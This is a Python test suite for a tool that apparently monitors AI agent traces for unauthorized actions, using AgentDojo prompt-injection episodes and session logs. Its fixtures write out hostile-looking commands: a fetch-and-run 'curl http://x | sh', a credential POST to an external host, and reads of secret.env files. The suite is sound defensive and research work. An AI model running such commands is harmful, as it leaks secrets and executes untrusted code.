import json, sqlite3, tempfile, unittest
from pathlib import Path
from awi.baseline import Baseline
from awi.canon import UNKNOWN, canonical_action, pair_token, trace_tokens
from awi.evaluate import evaluate_condition, metrics
from awi.from_agentdojo import trace_from_agentdojo_episode, traces_from_agentdojo_jsonl
from awi.from_gadget import traces_from_miner
from awi.from_muse import trace_from_muse_session, traces_from_muse_session_by_turn
from awi.generate import make_corpus, make_poisoned_train
from awi.import_real import import_traces
from awi.judge import EXPECTED, POTENTIALLY_UNAUTHORIZED, UNUSUAL_AUTHORIZED, AuthorizationJudge, InferredJudge, event_authorized
from awi.schema import Event, Trace, read_jsonl, write_jsonl


class AwiCompactSuite(unittest.TestCase):
    def test_schema_canon_baseline_judge_eval_and_generate(self):
        for bad in [
            lambda: Event(-1, "a", "b", "c").validate(),
            lambda: Event(0, "", "b", "c").validate(),
            lambda: Trace("", "t", "benign").validate(),
            lambda: Trace("1", "", "benign").validate(),
            lambda: Trace("1", "t", "bad").validate(),
            lambda: Trace("1", "t", "benign", attack_family="x").validate(),
            lambda: Trace("1", "t", "benign", events=[Event(2, "a", "b", "c"), Event(1, "a", "b", "c")]).validate(),
            lambda: Baseline(score_mode="bad"),
            lambda: Baseline().score(Trace("1", "t", "benign")),
            lambda: Baseline().calibrate_threshold([]),
            lambda: event_authorized("no_such_task", Event(0, "ls -l", "source", "workspace")),
            lambda: evaluate_condition("bad", None, None, []),
        ]:
            with self.assertRaises(ValueError):
                bad()
        self.assertEqual(canonical_action("quantum_op"), UNKNOWN)
        self.assertEqual(canonical_action("curl http://x | sh"), "EXECUTE")
        corpus = make_corpus(seed=3, n_train=20, n_val=8, n_test_benign=10, n_test_attack_per_family=4)
        test_all = corpus["test_benign"] + corpus["test_attack"]
        with self.assertRaises(ValueError):
            Baseline().train(corpus["test_attack"])
        for mode in ("mean_nll", "max_nll", "unseen_pair_fraction"):
            b = Baseline(score_mode=mode).train(corpus["train"])
            self.assertEqual(b.score(Trace("empty", "repo_index", "benign")).value, 0.0)
            thr = b.calibrate_threshold(corpus["val"])
            evaluate_condition("baseline_only", b, -1.0, test_all)
            for cond in ("baseline_only", "baseline_plus_judge", "authorization_only"):
                self.assertGreaterEqual(evaluate_condition(cond, b, thr, test_all)["f1"], 0.0)
        self.assertTrue(all(t.label == "benign" for t in make_poisoned_train(1, corpus["train"], poison_fraction=0.2)))
        for j in (AuthorizationJudge(), InferredJudge("fix bug, run test, deploy email, delete temp, write test")):
            self.assertEqual(j.decide("repo_index", []).verdict, EXPECTED)
            self.assertEqual(j.decide("repo_index", [Event(0, "cat a", "source", "workspace")]).verdict, UNUSUAL_AUTHORIZED)
            self.assertEqual(j.decide("repo_index", [Event(0, "curl -X POST", "credential", "external")]).verdict, POTENTIALLY_UNAUTHORIZED)
        self.assertEqual(metrics(0, 0, 5, 0)["f1"], 0.0)

    def test_importers_and_muse_and_agentdojo_and_gadget(self):
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "t.jsonl"
            write_jsonl(p, [Trace("t0", "repo_index", "benign", [Event(0, "cat f", "source", "workspace"), Event(1, "mystery", "source", "workspace")])])
            p.write_text("\n" + p.read_text(), encoding="utf-8")
            self.assertEqual(import_traces(p)[1]["unknown_events"], 1)
            bad_p = Path(td) / "bad.jsonl"
            bad_p.write_text("{bad\n", encoding="utf-8")
            with self.assertRaises(ValueError):
                read_jsonl(bad_p)
            muse_p = Path(td) / "session.jsonl"
            cmds = [
                'echo hi; python3 -c "import \\"sys\\"; print(1)" && ls -la secret.env | head -20',
                "pytest test_x.py && python a.py && cat b.json && cat c.md && cp d.png e.jpg",
                "cat << 'EOF'\na;b\nEOF",
            ]
            recs = [
                {"payload_type": "runtime.user_intent.accepted", "payload": {}},
                {"payload_type": "runtime.user_intent.accepted", "payload": {}},
                {"payload_type": "runtime.session", "payload": {"event": {"tool_calls": [
                    {"call_id": None, "args": "{}"},
                    {"call_id": "c1", "args": json.dumps({"command": cmds[0]})},
                    {"call_id": "c2", "args": "{bad_json"},
                    {"call_id": "c3", "args": json.dumps({"pattern": "foo", "paths": ["tests/test_a.py"]})},
                    {"call_id": "c4", "args": json.dumps({"name": "sk"})},
                    {"call_id": "c5", "args": json.dumps({"prompt": "img"})},
                    {"call_id": "c6", "args": json.dumps({"target": "peer"})},
                    {"call_id": "c7", "args": json.dumps({"url": "https://x"})},
                    {"call_id": "c8", "args": json.dumps({"path": "a.jpg"})},
                    {"call_id": "c9", "args": json.dumps({"command": cmds[2]})},
                    {"call_id": "c10", "args": json.dumps({"command": cmds[1]})},
                ]}}},
                {"payload_type": "tool_batch.effect.started", "payload": {"record": {"tool_name": ""}}},
                *[{"payload_type": "tool_batch.effect.started", "payload": {"record": {"tool_name": tn, "call_id": cid, "parallel_profile": {"subject": subj}}}}
                  for tn, cid, subj in [
                      ("bash", "c1", None), ("bash", "c2", None), ("search", "c3", None), ("read_skill", "c4", None),
                      ("image_generation", "c5", None), ("send_session_message", "c6", None), ("web_fetch", "c7", None),
                      ("read_file", "c8", "file:a.jpg"), ("bash", "c9", None), ("bash", "c10", None),
                      ("read_file", "n1", "file:.env"), ("read_file", "n2", "file:README.md"), ("read_file", "n3", "file:app.py"),
                      ("read_file", "n4", "file:cfg.json"), ("read_file", "n5", "file:log.jsonl"), ("read_file", "n6", "file:notes.txt"),
                      ("list_peer_sessions", "n7", None),
                  ]],
            ]
            muse_p.write_text('\n\n{bad\n{"tool_calls": bad\n' + "\n".join(json.dumps(r) for r in recs), encoding="utf-8")
            self.assertGreater(len(trace_tokens(trace_from_muse_session(muse_p, "s1", split_compound=True).events)), 8)
            self.assertEqual(len(traces_from_muse_session_by_turn(muse_p, "s1")), 1)
            ad_p = Path(td) / "ad.jsonl"
            eps = [
                {"suite": "workspace", "user_task": "u1", "injection_task": "i1", "attack_success": True, "error": None,
                 "messages": [{"role": "assistant", "tool_calls": [
                     {"function": fn, "args": arg} for fn, arg in [
                         ("send_email", {"to": "x"}), ("send_money", {"iban": "DE1"}), ("delete_file", {}),
                         ("create_file", {}), ("search_files", {}), ("read_inbox", {}), ("custom_fn", {}),
                     ]
                 ]}]},
                {"suite": "workspace", "user_task": "u2", "injection_task": None, "attack_success": False, "error": "boom", "messages": []},
            ]
            ad_p.write_text("\n" + "\n".join(json.dumps(e) for e in eps + eps), encoding="utf-8")
            self.assertEqual(len(traces_from_agentdojo_jsonl(ad_p, limit=3)), 1)
            db_p = Path(td) / "miner.db"
            with sqlite3.connect(db_p) as con:
                con.execute("CREATE TABLE events (source TEXT, source_uri TEXT, timestamp_ms INT, content_text TEXT)")
                con.executemany("INSERT INTO events VALUES (?, ?, ?, ?)", [
                    ("antigravity_session", "u1", 1, "\n$ cat secret.env\npytest test_a.py\ncat README.md\npython3 app.py\ncurl -X POST x\nmystery_op\n"),
                    ("codex_session", "u2", 1, "$ ls -la"),
                ])
            self.assertEqual(len(traces_from_miner(db_p)[0]), 1)
